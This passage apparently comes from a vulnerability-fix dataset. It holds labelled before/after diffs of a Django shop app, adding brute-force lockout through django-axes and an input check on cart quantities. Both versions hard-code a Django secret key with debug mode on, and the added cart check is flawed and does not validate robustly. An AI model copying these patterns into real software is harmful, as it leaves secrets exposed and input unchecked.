'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',\r\n+    },\r\n+    {\r\n+        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',\r\n+    },\r\n+    {\r\n+        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',\r\n+    },\r\n+    {\r\n+        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',\r\n+    },\r\n+]\r\n+\r\n+\r\n+# Internationalization\r\n+# https:\/\/docs.djangoproject.com\/en\/3.2\/topics\/i18n\/\r\n+\r\n+LANGUAGE_CODE = 'en-us'\r\n+\r\n+TIME_ZONE = 'Asia\/Ho_Chi_Minh'\r\n+\r\n+USE_I18N = True\r\n+\r\n+USE_L10N = True\r\n+\r\n+USE_TZ = True\r\n+\r\n+\r\n+# Static files (CSS, JavaScript, Images)\r\n+# https:\/\/docs.djangoproject.com\/en\/3.2\/howto\/static-files\/\r\n+\r\n+STATIC_URL = '\/static\/'\r\n+STATICFILES_DIRS = [\r\n+    BASE_DIR \/ \"templates\/static\",\r\n+]\r\n+STATIC_ROOT = os.path.join(BASE_DIR, 'static')\r\n+\r\n+DEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'\r\n+\r\n+# Cart session ID\r\n+CART_SESSION_ID = \"cart\"\r\n+\r\n+LOGIN_URL = '\/login'\r\n+LOGIN_REDIRECT_URL = '\/login'\r\n+\r\n+EMAIL_BACKEND = \"django.core.mail.backends.smtp.EmailBackend\"\r\n+EMAIL_HOST = 'smtp.gmail.com'\r\n+EMAIL_HOST_USER = ''  # Email s\u1eed dung \u0111\u1ec3 g\u1eedi mail t\u1edbi kh\u00e1ch h\u00e0ng\r\n+EMAIL_HOST_PASSWORD = ''  # M\u1eadt kh\u1ea9u email\r\n+EMAI_PORT = 587\r\n+EMAIL_USE_TLS = True\r\n+\r\n+# Configure on django_axes, prevent login bruteforce\r\n+# After 5 times login failed, user will be banned\r\n+AXES_FAILURE_LIMIT = 5\r\n+# Reset time is 1 hour\r\n+AXES_COOLOFF_TIME = 1\r\n+AXES_RESET_ON_SUCCESS = True\r\n+AXES_LOCK_OUT_BY_COMBINATION_USER_AND_IP = True\r\n+AXES_LOCKOUT_URL = '\/lockedout'\r","add":170,"remove":151,"filename":"\/DiChoHo\/DiChoHo\/settings.py","badparts":["\"\"\"","Django settings for DiChoHo project.","Generated by 'django-admin startproject' using Django 3.2.7.","For more information on this file, see","https:\/\/docs.djangoproject.com\/en\/3.2\/topics\/settings\/","For the full list of settings and their values, see","https:\/\/docs.djangoproject.com\/en\/3.2\/ref\/settings\/","\"\"\"","from pathlib import Path","BASE_DIR = Path(__file__).resolve().parent.parent","SECRET_KEY = 'django-insecure-=$3=r_!k(1_%nzxs_7^ip4ar(mn+^#a32m8rlo1)8v7ntkyznc'","DEBUG = True","ALLOWED_HOSTS = ['127.0.0.1', 'localhost', '192.168.1.20']","INSTALLED_APPS = [","    'django.contrib.admin',","    'django.contrib.auth',","    'django.contrib.contenttypes',","    'django.contrib.sessions',","    'django.contrib.messages',","    'django.contrib.staticfiles',","    'shop',","    'orders',","    'checkout'","]","MIDDLEWARE = [","    'django.middleware.security.SecurityMiddleware',","    'django.contrib.sessions.middleware.SessionMiddleware',","    'django.middleware.common.CommonMiddleware',","    'django.middleware.csrf.CsrfViewMiddleware',","    'django.contrib.auth.middleware.AuthenticationMiddleware',","    'django.contrib.messages.middleware.MessageMiddleware',","    'django.middleware.clickjacking.XFrameOptionsMiddleware',","]","ROOT_URLCONF = 'DiChoHo.urls'","TEMPLATES = [","    {","        'BACKEND': 'django.template.backends.django.DjangoTemplates',","        'DIRS': [","            BASE_DIR \/ 'templates'","        ],","        'APP_DIRS': True,","        'OPTIONS': {","            'context_processors': [","                'django.template.context_processors.debug',","                'django.template.context_processors.request',","                'django.contrib.auth.context_processors.auth',","                'django.contrib.messages.context_processors.messages',","                'shop.context_processors.cart',","            ],","        },","    },","]","WSGI_APPLICATION = 'DiChoHo.wsgi.application'","DATABASES = {","    'default': {","        'ENGINE': 'django.db.backends.mysql', ","        'NAME': os.environ.get('MYSQL_NAME'),","        'USER': os.environ.get('MYSQL_USER'),","        'PASSWORD': os.environ.get('MYSQL_PASSWORD'),","        'HOST': 'db',","        'PORT': '3306',","    }","}","AUTH_PASSWORD_VALIDATORS = [","    {","        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',","    },","    {","        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',","    },","    {","        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',","    },","    {","        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',","    },","]","LANGUAGE_CODE = 'en-us'","TIME_ZONE = 'Asia\/Ho_Chi_Minh'","USE_I18N = True","USE_L10N = True","USE_TZ = True","STATIC_URL = '\/static\/'","STATICFILES_DIRS = [","    BASE_DIR \/ \"templates\/static\",","]","STATIC_ROOT = os.path.join(BASE_DIR, 'static')","DEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'","CART_SESSION_ID = \"cart\"","LOGIN_URL='\/login'","LOGIN_REDIRECT_URL='\/login'","EMAIL_BACKEND = \"django.core.mail.backends.smtp.EmailBackend\"","EMAIL_HOST = 'smtp.gmail.com'","EMAIL_HOST_USER ='' # Email s\u1eed dung \u0111\u1ec3 g\u1eedi mail t\u1edbi kh\u00e1ch h\u00e0ng","EMAIL_HOST_PASSWORD = '' # M\u1eadt kh\u1ea9u email","EMAI_PORT = 587","EMAIL_USE_TLS = True"],"goodparts":["\"\"\"\r","Django settings for DiChoHo project.\r","\r","Generated by 'django-admin startproject' using Django 3.2.7.\r","\r","For more information on this file, see\r","https:\/\/docs.djangoproject.com\/en\/3.2\/topics\/settings\/\r","\r","For the full list of settings and their values, see\r","https:\/\/docs.djangoproject.com\/en\/3.2\/ref\/settings\/\r","\"\"\"\r","\r","from pathlib import Path\r","\r","BASE_DIR = Path(__file__).resolve().parent.parent\r","\r","\r","\r","SECRET_KEY = 'django-insecure-=$3=r_!k(1_%nzxs_7^ip4ar(mn+^#a32m8rlo1)8v7ntkyznc'\r","\r","DEBUG = True\r","\r","ALLOWED_HOSTS = ['127.0.0.1', 'localhost']\r","\r","\r","\r","INSTALLED_APPS = [\r","    'django.contrib.admin',\r","    'django.contrib.auth',\r","    'django.contrib.contenttypes',\r","    'django.contrib.sessions',\r","    'django.contrib.messages',\r","    'django.contrib.staticfiles',\r","\r","    'shop',\r","    'orders',\r","    'checkout',\r","    'axes'\r","]\r","\r","MIDDLEWARE = [\r","    'django.middleware.security.SecurityMiddleware',\r","    'django.contrib.sessions.middleware.SessionMiddleware',\r","    'django.middleware.common.CommonMiddleware',\r","    'django.middleware.csrf.CsrfViewMiddleware',\r","    'django.contrib.auth.middleware.AuthenticationMiddleware',\r","    'django.contrib.messages.middleware.MessageMiddleware',\r","    'django.middleware.clickjacking.XFrameOptionsMiddleware',\r","    'axes.middleware.AxesMiddleware'\r","]\r","\r","AUTHENTICATION_BACKENDS = [\r","    'axes.backends.AxesBackend',\r","\r","    'django.contrib.auth.backends.ModelBackend',\r","]\r","\r","ROOT_URLCONF = 'DiChoHo.urls'\r","\r","TEMPLATES = [\r","    {\r","        'BACKEND': 'django.template.backends.django.DjangoTemplates',\r","        'DIRS': [\r","            BASE_DIR \/ 'templates'\r","        ],\r","        'APP_DIRS': True,\r","        'OPTIONS': {\r","            'context_processors': [\r","                'django.template.context_processors.debug',\r","                'django.template.context_processors.request',\r","                'django.contrib.auth.context_processors.auth',\r","                'django.contrib.messages.context_processors.messages',\r","                'shop.context_processors.cart',\r","            ],\r","        },\r","    },\r","]\r","\r","WSGI_APPLICATION = 'DiChoHo.wsgi.application'\r","\r","\r","\r","DATABASES = {\r","    'default': {\r","        'ENGINE': 'django.db.backends.mysql',\r","        'NAME': 'profileuser',\r","        'USER': '',\r","        'PASSWORD': '',\r","        'HOST': 'localhost',\r","        'PORT': '3306',\r","    }\r","}\r","\r","\r","\r","AUTH_PASSWORD_VALIDATORS = [\r","    {\r","        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',\r","    },\r","    {\r","        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',\r","    },\r","    {\r","        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',\r","    },\r","    {\r","        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',\r","    },\r","]\r","\r","\r","\r","LANGUAGE_CODE = 'en-us'\r","\r","TIME_ZONE = 'Asia\/Ho_Chi_Minh'\r","\r","USE_I18N = True\r","\r","USE_L10N = True\r","\r","USE_TZ = True\r","\r","\r","\r","STATIC_URL = '\/static\/'\r","STATICFILES_DIRS = [\r","    BASE_DIR \/ \"templates\/static\",\r","]\r","STATIC_ROOT = os.path.join(BASE_DIR, 'static')\r","\r","DEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'\r","\r","CART_SESSION_ID = \"cart\"\r","\r","LOGIN_URL = '\/login'\r","LOGIN_REDIRECT_URL = '\/login'\r","\r","EMAIL_BACKEND = \"django.core.mail.backends.smtp.EmailBackend\"\r","EMAIL_HOST = 'smtp.gmail.com'\r","EMAIL_HOST_USER = ''  # Email s\u1eed dung \u0111\u1ec3 g\u1eedi mail t\u1edbi kh\u00e1ch h\u00e0ng\r","EMAIL_HOST_PASSWORD = ''  # M\u1eadt kh\u1ea9u email\r","EMAI_PORT = 587\r","EMAIL_USE_TLS = True\r","\r","AXES_FAILURE_LIMIT = 5\r","AXES_COOLOFF_TIME = 1\r","AXES_RESET_ON_SUCCESS = True\r","AXES_LOCK_OUT_BY_COMBINATION_USER_AND_IP = True\r","AXES_LOCKOUT_URL = '\/lockedout'\r"]}],"source":"\n\"\"\" Django settings for DiChoHo project. Generated by 'django-admin startproject' using Django 3.2.7. For more information on this file, see https:\/\/docs.djangoproject.com\/en\/3.2\/topics\/settings\/ For the full list of settings and their values, see https:\/\/docs.djangoproject.com\/en\/3.2\/ref\/settings\/ \"\"\" from pathlib import Path import os BASE_DIR=Path(__file__).resolve().parent.parent SECRET_KEY='django-insecure-=$3=r_!k(1_%nzxs_7^ip4ar(mn+^ DEBUG=True ALLOWED_HOSTS=['127.0.0.1', 'localhost', '192.168.1.20'] INSTALLED_APPS=[ 'django.contrib.admin', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions', 'django.contrib.messages', 'django.contrib.staticfiles', 'shop', 'orders', 'checkout' ] MIDDLEWARE=[ 'django.middleware.security.SecurityMiddleware', 'django.contrib.sessions.middleware.SessionMiddleware', 'django.middleware.common.CommonMiddleware', 'django.middleware.csrf.CsrfViewMiddleware', 'django.contrib.auth.middleware.AuthenticationMiddleware', 'django.contrib.messages.middleware.MessageMiddleware', 'django.middleware.clickjacking.XFrameOptionsMiddleware', ] ROOT_URLCONF='DiChoHo.urls' TEMPLATES=[ { 'BACKEND': 'django.template.backends.django.DjangoTemplates', 'DIRS':[ BASE_DIR \/ 'templates' ], 'APP_DIRS': True, 'OPTIONS':{ 'context_processors':[ 'django.template.context_processors.debug', 'django.template.context_processors.request', 'django.contrib.auth.context_processors.auth', 'django.contrib.messages.context_processors.messages', 'shop.context_processors.cart', ], }, }, ] WSGI_APPLICATION='DiChoHo.wsgi.application' DATABASES={ 'default':{ 'ENGINE': 'django.db.backends.mysql', 'NAME': os.environ.get('MYSQL_NAME'), 'USER': os.environ.get('MYSQL_USER'), 'PASSWORD': os.environ.get('MYSQL_PASSWORD'), 'HOST': 'db', 'PORT': '3306', } } AUTH_PASSWORD_VALIDATORS=[ { 'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator', }, { 'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator', }, { 'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator', }, { 'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator', }, ] LANGUAGE_CODE='en-us' TIME_ZONE='Asia\/Ho_Chi_Minh' USE_I18N=True USE_L10N=True USE_TZ=True STATIC_URL='\/static\/' STATICFILES_DIRS=[ BASE_DIR \/ \"templates\/static\", ] STATIC_ROOT=os.path.join(BASE_DIR, 'static') DEFAULT_AUTO_FIELD='django.db.models.BigAutoField' CART_SESSION_ID=\"cart\" LOGIN_URL='\/login' LOGIN_REDIRECT_URL='\/login' EMAIL_BACKEND=\"django.core.mail.backends.smtp.EmailBackend\" EMAIL_HOST='smtp.gmail.com' EMAIL_HOST_USER='' EMAIL_HOST_PASSWORD='' EMAI_PORT=587 EMAIL_USE_TLS=True ","sourceWithComments":"\"\"\"\nDjango settings for DiChoHo project.\n\nGenerated by 'django-admin startproject' using Django 3.2.7.\n\nFor more information on this file, see\nhttps:\/\/docs.djangoproject.com\/en\/3.2\/topics\/settings\/\n\nFor the full list of settings and their values, see\nhttps:\/\/docs.djangoproject.com\/en\/3.2\/ref\/settings\/\n\"\"\"\n\nfrom pathlib import Path\nimport os\n\n# Build paths inside the project like this: BASE_DIR \/ 'subdir'.\nBASE_DIR = Path(__file__).resolve().parent.parent\n\n\n# Quick-start development settings - unsuitable for production\n# See https:\/\/docs.djangoproject.com\/en\/3.2\/howto\/deployment\/checklist\/\n\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = 'django-insecure-=$3=r_!k(1_%nzxs_7^ip4ar(mn+^#a32m8rlo1)8v7ntkyznc'\n\n# SECURITY WARNING: don't run with debug turned on in production!\nDEBUG = True\n\nALLOWED_HOSTS = ['127.0.0.1', 'localhost', '192.168.1.20']\n\n\n# Application definition\n\nINSTALLED_APPS = [\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.staticfiles',\n\n    'shop',\n    'orders',\n    'checkout'\n]\n\nMIDDLEWARE = [\n    'django.middleware.security.SecurityMiddleware',\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n]\n\nROOT_URLCONF = 'DiChoHo.urls'\n\nTEMPLATES = [\n    {\n        'BACKEND': 'django.template.backends.django.DjangoTemplates',\n        'DIRS': [\n            BASE_DIR \/ 'templates'\n        ],\n        'APP_DIRS': True,\n        'OPTIONS': {\n            'context_processors': [\n                'django.template.context_processors.debug',\n                'django.template.context_processors.request',\n                'django.contrib.auth.context_processors.auth',\n                'django.contrib.messages.context_processors.messages',\n                'shop.context_processors.cart',\n            ],\n        },\n    },\n]\n\nWSGI_APPLICATION = 'DiChoHo.wsgi.application'\n\n\n# Database\n# https:\/\/docs.djangoproject.com\/en\/3.2\/ref\/settings\/#databases\n\nDATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.mysql', \n        'NAME': os.environ.get('MYSQL_NAME'),\n        'USER': os.environ.get('MYSQL_USER'),\n        'PASSWORD': os.environ.get('MYSQL_PASSWORD'),\n        'HOST': 'db',\n        'PORT': '3306',\n    }\n}\n\n\n# Password validation\n# https:\/\/docs.djangoproject.com\/en\/3.2\/ref\/settings\/#auth-password-validators\n\nAUTH_PASSWORD_VALIDATORS = [\n    {\n        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',\n    },\n]\n\n\n# Internationalization\n# https:\/\/docs.djangoproject.com\/en\/3.2\/topics\/i18n\/\n\nLANGUAGE_CODE = 'en-us'\n\nTIME_ZONE = 'Asia\/Ho_Chi_Minh'\n\nUSE_I18N = True\n\nUSE_L10N = True\n\nUSE_TZ = True\n\n\n# Static files (CSS, JavaScript, Images)\n# https:\/\/docs.djangoproject.com\/en\/3.2\/howto\/static-files\/\n\nSTATIC_URL = '\/static\/'\nSTATICFILES_DIRS = [\n    BASE_DIR \/ \"templates\/static\",\n]\nSTATIC_ROOT = os.path.join(BASE_DIR, 'static')\n\nDEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'\n\n#Cart session ID\nCART_SESSION_ID = \"cart\"\n\nLOGIN_URL='\/login'\nLOGIN_REDIRECT_URL='\/login'\n\nEMAIL_BACKEND = \"django.core.mail.backends.smtp.EmailBackend\"\nEMAIL_HOST = 'smtp.gmail.com'\nEMAIL_HOST_USER ='' # Email s\u1eed dung \u0111\u1ec3 g\u1eedi mail t\u1edbi kh\u00e1ch h\u00e0ng\nEMAIL_HOST_PASSWORD = '' # M\u1eadt kh\u1ea9u email\nEMAI_PORT = 587\nEMAIL_USE_TLS = True"},"\/DiChoHo\/shop\/urls.py":{"changes":[{"diff":"\n \n urlpatterns = [\n \n-     path('', views.index_view, name='home'),\n-     path('login\/', views.login_view, name='login'),\n-     path('register\/', views.register_view, name='register'),\n-     path('logout\/', views.logout_view, name='logout'),\n-     path('about\/', views.about_view, name='about'),\n-     # wishlist\n-     path('wishlist\/', views.wishlist_view, name='wishlist'),\n-     path('wishlist\/add', views.wishlist_add, name='wishlist_add'),\n-     path('wishlist\/delete', views.wishlist_delete, name='wishlist_delete'),\n-     # shop, product\n-     path('shop\/', views.shop_view, name='shop'),\n-     path('product\/<slug:slug>', views.product_detail, name='product_detail'),\n-     path('shop\/<slug:category_slug>\/', views.category_list, name='category_list'),\n-     # cart\n-     path('cart\/', views.cart_view, name='cart'),\n-     path('cart\/add\/', views.cart_add, name='cart_add'),\n-     path('cart\/delete\/', views.cart_delete, name='cart_delete'),\n-     path('cart\/update\/', views.cart_update, name='cart_update'),\n-     #profile\n-     path('profile\/', views.profile_view, name='profile'),\n-     path(\"profile\/add_addresses\", views.add_address, name=\"add_address\"),\n-     path(\"profile\/edit_addresses\/<slug:id>\/\", views.edit_address, name=\"edit_address\"),\n-     path(\"profile\/delete_addresses\/<slug:id>\/\", views.delete_address, name=\"delete_address\"),\n-     path(\"profile\/set_address_default\/<slug:id>\/\", views.set_address_default, name=\"set_address_default\"),\n-     path(\"profile\/edit_profile\/<slug:id>\/\",  views.edit_profile, name=\"edit_profile\"),\n-     path(\"profile\/review\", views.review_add, name=\"review_add\"),\n-     # something else\n-     path('search\/', views.search_views, name='search_views'),\n-     path('404\/', views.page_not_found, name='404'),\n+    path('', views.index_view, name='home'),\n+    path('login\/', views.login_view, name='login'),\n+    path('register\/', views.register_view, name='register'),\n+    path('logout\/', views.logout_view, name='logout'),\n+    path('about\/', views.about_view, name='about'),\n+    # wishlist\n+    path('wishlist\/', views.wishlist_view, name='wishlist'),\n+    path('wishlist\/add', views.wishlist_add, name='wishlist_add'),\n+    path('wishlist\/delete', views.wishlist_delete, name='wishlist_delete'),\n+    # shop, product\n+    path('shop\/', views.shop_view, name='shop'),\n+    path('product\/<slug:slug>', views.product_detail, name='product_detail'),\n+    path('shop\/<slug:category_slug>\/',\n+         views.category_list, name='category_list'),\n+    # cart\n+    path('cart\/', views.cart_view, name='cart'),\n+    path('cart\/add\/', views.cart_add, name='cart_add'),\n+    path('cart\/delete\/', views.cart_delete, name='cart_delete'),\n+    path('cart\/update\/', views.cart_update, name='cart_update'),\n+    # profile\n+    path('profile\/', views.profile_view, name='profile'),\n+    path(\"profile\/add_addresses\", views.add_address, name=\"add_address\"),\n+    path(\"profile\/edit_addresses\/<slug:id>\/\",\n+         views.edit_address, name=\"edit_address\"),\n+    path(\"profile\/delete_addresses\/<slug:id>\/\",\n+         views.delete_address, name=\"delete_address\"),\n+    path(\"profile\/set_address_default\/<slug:id>\/\",\n+         views.set_address_default, name=\"set_address_default\"),\n+    path(\"profile\/edit_profile\/<slug:id>\/\",\n+         views.edit_profile, name=\"edit_profile\"),\n+    path(\"profile\/review\", views.review_add, name=\"review_add\"),\n+    # something else\n+    path('search\/', views.search_views, name='search_views'),\n+    path('404\/', views.page_not_found, name='404'),\n+    path('lockedout', views.locked_out, name='lockedout'),\n ","add":35,"remove":29,"filename":"\/DiChoHo\/shop\/urls.py","badparts":["     path('', views.index_view, name='home'),","     path('login\/', views.login_view, name='login'),","     path('register\/', views.register_view, name='register'),","     path('logout\/', views.logout_view, name='logout'),","     path('about\/', views.about_view, name='about'),","     path('wishlist\/', views.wishlist_view, name='wishlist'),","     path('wishlist\/add', views.wishlist_add, name='wishlist_add'),","     path('wishlist\/delete', views.wishlist_delete, name='wishlist_delete'),","     path('shop\/', views.shop_view, name='shop'),","     path('product\/<slug:slug>', views.product_detail, name='product_detail'),","     path('shop\/<slug:category_slug>\/', views.category_list, name='category_list'),","     path('cart\/', views.cart_view, name='cart'),","     path('cart\/add\/', views.cart_add, name='cart_add'),","     path('cart\/delete\/', views.cart_delete, name='cart_delete'),","     path('cart\/update\/', views.cart_update, name='cart_update'),","     path('profile\/', views.profile_view, name='profile'),","     path(\"profile\/add_addresses\", views.add_address, name=\"add_address\"),","     path(\"profile\/edit_addresses\/<slug:id>\/\", views.edit_address, name=\"edit_address\"),","     path(\"profile\/delete_addresses\/<slug:id>\/\", views.delete_address, name=\"delete_address\"),","     path(\"profile\/set_address_default\/<slug:id>\/\", views.set_address_default, name=\"set_address_default\"),","     path(\"profile\/edit_profile\/<slug:id>\/\",  views.edit_profile, name=\"edit_profile\"),","     path(\"profile\/review\", views.review_add, name=\"review_add\"),","     path('search\/', views.search_views, name='search_views'),","     path('404\/', views.page_not_found, name='404'),"],"goodparts":["    path('', views.index_view, name='home'),","    path('login\/', views.login_view, name='login'),","    path('register\/', views.register_view, name='register'),","    path('logout\/', views.logout_view, name='logout'),","    path('about\/', views.about_view, name='about'),","    path('wishlist\/', views.wishlist_view, name='wishlist'),","    path('wishlist\/add', views.wishlist_add, name='wishlist_add'),","    path('wishlist\/delete', views.wishlist_delete, name='wishlist_delete'),","    path('shop\/', views.shop_view, name='shop'),","    path('product\/<slug:slug>', views.product_detail, name='product_detail'),","    path('shop\/<slug:category_slug>\/',","         views.category_list, name='category_list'),","    path('cart\/', views.cart_view, name='cart'),","    path('cart\/add\/', views.cart_add, name='cart_add'),","    path('cart\/delete\/', views.cart_delete, name='cart_delete'),","    path('cart\/update\/', views.cart_update, name='cart_update'),","    path('profile\/', views.profile_view, name='profile'),","    path(\"profile\/add_addresses\", views.add_address, name=\"add_address\"),","    path(\"profile\/edit_addresses\/<slug:id>\/\",","         views.edit_address, name=\"edit_address\"),","    path(\"profile\/delete_addresses\/<slug:id>\/\",","         views.delete_address, name=\"delete_address\"),","    path(\"profile\/set_address_default\/<slug:id>\/\",","         views.set_address_default, name=\"set_address_default\"),","    path(\"profile\/edit_profile\/<slug:id>\/\",","         views.edit_profile, name=\"edit_profile\"),","    path(\"profile\/review\", views.review_add, name=\"review_add\"),","    path('search\/', views.search_views, name='search_views'),","    path('404\/', views.page_not_found, name='404'),","    path('lockedout', views.locked_out, name='lockedout'),"]}],"source":"\nfrom django.urls import path from shop import views from django.conf.urls import url urlpatterns=[ path('', views.index_view, name='home'), path('login\/', views.login_view, name='login'), path('register\/', views.register_view, name='register'), path('logout\/', views.logout_view, name='logout'), path('about\/', views.about_view, name='about'), path('wishlist\/', views.wishlist_view, name='wishlist'), path('wishlist\/add', views.wishlist_add, name='wishlist_add'), path('wishlist\/delete', views.wishlist_delete, name='wishlist_delete'), path('shop\/', views.shop_view, name='shop'), path('product\/<slug:slug>', views.product_detail, name='product_detail'), path('shop\/<slug:category_slug>\/', views.category_list, name='category_list'), path('cart\/', views.cart_view, name='cart'), path('cart\/add\/', views.cart_add, name='cart_add'), path('cart\/delete\/', views.cart_delete, name='cart_delete'), path('cart\/update\/', views.cart_update, name='cart_update'), path('profile\/', views.profile_view, name='profile'), path(\"profile\/add_addresses\", views.add_address, name=\"add_address\"), path(\"profile\/edit_addresses\/<slug:id>\/\", views.edit_address, name=\"edit_address\"), path(\"profile\/delete_addresses\/<slug:id>\/\", views.delete_address, name=\"delete_address\"), path(\"profile\/set_address_default\/<slug:id>\/\", views.set_address_default, name=\"set_address_default\"), path(\"profile\/edit_profile\/<slug:id>\/\", views.edit_profile, name=\"edit_profile\"), path(\"profile\/review\", views.review_add, name=\"review_add\"), path('search\/', views.search_views, name='search_views'), path('404\/', views.page_not_found, name='404'), ] ","sourceWithComments":"from django.urls import path\nfrom shop import views\nfrom django.conf.urls import url\n\nurlpatterns = [\n\n     path('', views.index_view, name='home'),\n     path('login\/', views.login_view, name='login'),\n     path('register\/', views.register_view, name='register'),\n     path('logout\/', views.logout_view, name='logout'),\n     path('about\/', views.about_view, name='about'),\n     # wishlist\n     path('wishlist\/', views.wishlist_view, name='wishlist'),\n     path('wishlist\/add', views.wishlist_add, name='wishlist_add'),\n     path('wishlist\/delete', views.wishlist_delete, name='wishlist_delete'),\n     # shop, product\n     path('shop\/', views.shop_view, name='shop'),\n     path('product\/<slug:slug>', views.product_detail, name='product_detail'),\n     path('shop\/<slug:category_slug>\/', views.category_list, name='category_list'),\n     # cart\n     path('cart\/', views.cart_view, name='cart'),\n     path('cart\/add\/', views.cart_add, name='cart_add'),\n     path('cart\/delete\/', views.cart_delete, name='cart_delete'),\n     path('cart\/update\/', views.cart_update, name='cart_update'),\n     #profile\n     path('profile\/', views.profile_view, name='profile'),\n     path(\"profile\/add_addresses\", views.add_address, name=\"add_address\"),\n     path(\"profile\/edit_addresses\/<slug:id>\/\", views.edit_address, name=\"edit_address\"),\n     path(\"profile\/delete_addresses\/<slug:id>\/\", views.delete_address, name=\"delete_address\"),\n     path(\"profile\/set_address_default\/<slug:id>\/\", views.set_address_default, name=\"set_address_default\"),\n     path(\"profile\/edit_profile\/<slug:id>\/\",  views.edit_profile, name=\"edit_profile\"),\n     path(\"profile\/review\", views.review_add, name=\"review_add\"),\n     # something else\n     path('search\/', views.search_views, name='search_views'),\n     path('404\/', views.page_not_found, name='404'),\n]\n"},"\/DiChoHo\/shop\/views.py":{"changes":[{"diff":"\n \n \n def handler404(request):\n-    response = django.shortcuts.render_to_response('404.html', {}, context_instance=RequestContext(request))\n+    response = django.shortcuts.render_to_response(\n+        '404.html', {}, context_instance=RequestContext(request))\n     response.status_code = 404\n     return response\n \n # get index page\n+\n+\n def index_view(request):\n     products = Product.objects.all().order_by('-sold')\n     products2 = Product.objects.all().order_by('-created')\n","add":4,"remove":1,"filename":"\/DiChoHo\/shop\/views.py","badparts":["    response = django.shortcuts.render_to_response('404.html', {}, context_instance=RequestContext(request))"],"goodparts":["    response = django.shortcuts.render_to_response(","        '404.html', {}, context_instance=RequestContext(request))"]},{"diff":"\n     return render(request, 'shop.html', {'products': products})\n \n # get login page\n+\n+\n def login_view(request):\n     if request.user.is_authenticated:\n         return redirect('\/')\n     if request.method == 'POST':\n         getUsername = request.POST[\"username\"]\n         getPassword = request.POST[\"password\"]\n-        user = authenticate(username=getUsername,\n+        user = authenticate(request=request, username=getUsername,\n                             password=getPassword)\n         if user is not None:\n             login(request, user)\n","add":3,"remove":1,"filename":"\/DiChoHo\/shop\/views.py","badparts":["        user = authenticate(username=getUsername,"],"goodparts":["        user = authenticate(request=request, username=getUsername,"]},{"diff":"\n     print(average_stars)\n     average_stars_int = int(average_stars)\n     print(average_stars_int)\n-    return render(request, 'product-single.html', \n-                    {'product': product, 'relative_products': relative_products, \n-                    'ratings': allRatings, \"rating_count\": count, \n-                    'stars': average_stars, 'stars_int': range(average_stars_int), \n-                    'unstars_int': range(5 - average_stars_int)\n-                    })\n+    return render(request, 'product-single.html',\n+                  {'product': product, 'relative_products': relative_products,\n+                   'ratings': allRatings, \"rating_count\": count,\n+                   'stars': average_stars, 'stars_int': range(average_stars_int),\n+                   'unstars_int': range(5 - average_stars_int)\n+                   })\n \n \n-#review\n+# review\n @login_required\n def review_add(request):\n     # if request.method == \"POST\":\n","add":7,"remove":7,"filename":"\/DiChoHo\/shop\/views.py","badparts":["    return render(request, 'product-single.html', ","                    {'product': product, 'relative_products': relative_products, ","                    'ratings': allRatings, \"rating_count\": count, ","                    'stars': average_stars, 'stars_int': range(average_stars_int), ","                    'unstars_int': range(5 - average_stars_int)","                    })"],"goodparts":["    return render(request, 'product-single.html',","                  {'product': product, 'relative_products': relative_products,","                   'ratings': allRatings, \"rating_count\": count,","                   'stars': average_stars, 'stars_int': range(average_stars_int),","                   'unstars_int': range(5 - average_stars_int)","                   })"]},{"diff":"\n     cart = Cart(request)\n     return render(request, \"cart.html\", {\"cart\": cart})\n \n+\n def cart_add(request):\n-    cart = Cart(request)\n-    if request.POST.get(\"action\") == \"post\":\n-        product_id = int(request.POST.get(\"productid\"))\n-        product_qty = int(request.POST.get(\"productqty\"))\n-        product = get_object_or_404(Product, id=product_id)\n-        cart.add(product=product, qty=product_qty)\n-        cartqty = cart.__len__()\n-        response = JsonResponse({\"qty\": cartqty})\n-        return response\n+    if type(int(request.POST.get(\"productqty\"))) is int:\n+        if int(request.POST.get(\"productqty\")) > 0:\n+            cart = Cart(request)\n+            if request.POST.get(\"action\") == \"post\":\n+                product_id = int(request.POST.get(\"productid\"))\n+                product_qty = int(request.POST.get(\"productqty\"))\n+                product = get_object_or_404(Product, id=product_id)\n+                cart.add(product=product, qty=product_qty)\n+                cartqty = cart.__len__()\n+                response = JsonResponse({\"qty\": cartqty})\n+                return response\n+    else:\n+        print(type(request.POST.get(\"productqty\")))\n+\n \n def cart_delete(request):\n     cart = Cart(request)\n     if request.POST.get(\"action\") == \"post\":\n         product_id = int(request.POST.get(\"productid\"))\n         cart.delete(product=product_id)\n-\n         cartqty = cart.__len__()\n         carttotal = cart.get_total_price()\n         response = JsonResponse({\"qty\": 